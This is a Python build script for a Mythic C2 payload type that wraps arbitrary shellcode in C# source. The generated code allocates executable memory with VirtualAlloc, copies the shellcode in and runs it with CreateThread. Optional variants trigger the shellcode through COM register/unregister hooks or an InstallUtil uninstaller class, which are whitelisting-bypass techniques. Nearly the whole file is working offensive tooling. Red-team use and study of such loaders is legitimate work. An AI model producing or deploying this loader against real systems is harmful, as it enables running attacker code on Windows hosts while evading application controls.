import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import subprocess
import json
import string
import os
import shutil
import base64
import random

from io import BytesIO
from pathlib import Path
import zipfile

def zip_folder_to_bytes(folder_path: str | Path) -> bytes:
    folder = Path(folder_path).resolve()
    buf = BytesIO()
    with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for p in folder.rglob("*"):
            if p.is_file():
                # Store relative path inside the ZIP
                zf.write(p, arcname=p.relative_to(folder))
    return buf.getvalue()

LOAD_SHELLCODE = """
            {payload}

            IntPtr funcAddr = VirtualAlloc(
                              IntPtr.Zero,
                              (ulong)x64shellcode.Length,
                              (uint)StateEnum.MEM_COMMIT, 
                              (uint)Protection.PAGE_EXECUTE_READWRITE);
            Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.Length);

            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
"""

PINVOKES = """
        #region pinvokes
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            ulong size, 
            uint flAllocationType, 
            uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
        #endregion
"""

UNREGISTERCLASS = """
        [ComUnregisterFunction]
        public static void UnRegisterClass (string key)
        {
            Run();
        }
"""

REGISTERCLASS = """
        [ComRegisterFunction]
        public static void RegisterClass (string key)
        {
            Run();
        }
"""

RUNINSTALLER = """
    [System.ComponentModel.RunInstaller(true)]
    public class Install : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary state)
        {
            Bypass.Run();
        }
    }
"""


class csharp_wraps_shellcode(PayloadType):
    name = "csharp_wraps_shellcode"
    file_extension = "csharp"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["shellcode"]
    note = """Creates a CSharp payload which wraps a shellcode"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "dotNet"
    agent_icon_path = agent_path / "agent_functions" / "dotnet.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["Exe", "Library_unregister", "Library_register", "Library_runinstaller"],
            default_value="Exe",
            description="csharp type",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            shellcode = self.wrapped_payload
            cs_shellcode = "byte[] x64shellcode = new byte[%d] {\n" % len(shellcode)
            while(len(shellcode) > 0):
                part = [hex(b) for b in shellcode[0:16]]
                shellcode = shellcode[16:]

                cs_shellcode += ",".join(part)
                if len(shellcode) != 0:
                    cs_shellcode += ",\n"
                else:
                    cs_shellcode += ""
            cs_shellcode += "};"

            cs_code = LOAD_SHELLCODE.format(payload=cs_shellcode)
            cs_pinvokes = PINVOKES

            cs_type = self.get_parameter('type')
            cs_imports = ""
            cs_exports = ""
            cs_classes = ""

            if cs_type == "Exe":
                with open(self.agent_code_path / "csharp_shellcode.cs.j2") as f:
                    cs_template = f.read()
            elif cs_type.startswith("Library_"):
                with open(self.agent_code_path / "csharp_library_shellcode.cs.j2") as f:
                    cs_template = f.read()

                if cs_type == "Library_unregister":
                    cs_exports = UNREGISTERCLASS
                elif cs_type == "Library_register":
                    cs_exports = REGISTERCLASS
                elif cs_type == "Library_runinstaller":
                    cs_classes = RUNINSTALLER
                    cs_imports = "using System.Configuration.Install;"

            from jinja2 import Template

            template = Template(cs_template)

            # Render the template with data
            cs_code = template.render(imports=cs_imports, code=cs_code, export_funcs=cs_exports, pinvokes=cs_pinvokes, other_class=cs_classes)

            resp.payload = cs_code
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp

